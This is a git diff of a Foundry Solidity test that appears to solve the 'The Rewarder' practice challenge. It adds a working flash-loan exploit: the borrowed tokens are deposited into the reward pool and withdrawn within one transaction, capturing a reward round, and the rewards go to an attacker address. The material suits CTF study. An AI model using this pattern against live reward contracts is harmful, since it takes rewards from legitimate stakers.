@@ -90,8 +90,41 @@ contract TheRewarder is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        RewardToken rewardToken = theRewarderPool.rewardToken();
+        vm.warp(block.timestamp + 5 days);
+        uint256 flashLoanBalance = TOKENS_IN_LENDER_POOL;
+        dvt.approve(address(theRewarderPool), flashLoanBalance);
+        flashLoanerPool.flashLoan(flashLoanBalance);
+        theRewarderPool.distributeRewards();
+        // emit log_named_address("dvt", address(dvt));
+        // emit log_named_address(
+        //     "rewardToken",
+        //     address(theRewarderPool.rewardToken())
+        // );
+
+        require(
+            rewardToken.balanceOf(address(this)) > 0,
+            "reward balance was 0"
+        );
+
+        emit log_named_decimal_uint(
+            "this balance",
+            rewardToken.balanceOf(address(this)),
+            18
+        );
+        bool success = rewardToken.transfer(
+            attacker,
+            rewardToken.balanceOf(address(this))
+        );
+        require(success, "reward transfer failed");
         /** EXPLOIT END **/
         validation();
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
     }
 
     function validation() internal {
@@ -111,8 +144,9 @@ contract TheRewarder is Test {
         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
             attacker
         );
+        emit log_named_decimal_uint("rewardAttacker", rewardAttacker, 18);
 
-        // The amount of rewards earned should be really close to 100 tokens
+        // The amount of rewards earned should be really close to 100 tokens\
         uint256 deltaAttacker = 100e18 - rewardAttacker;
         assertLt(deltaAttacker, 1e17);
 
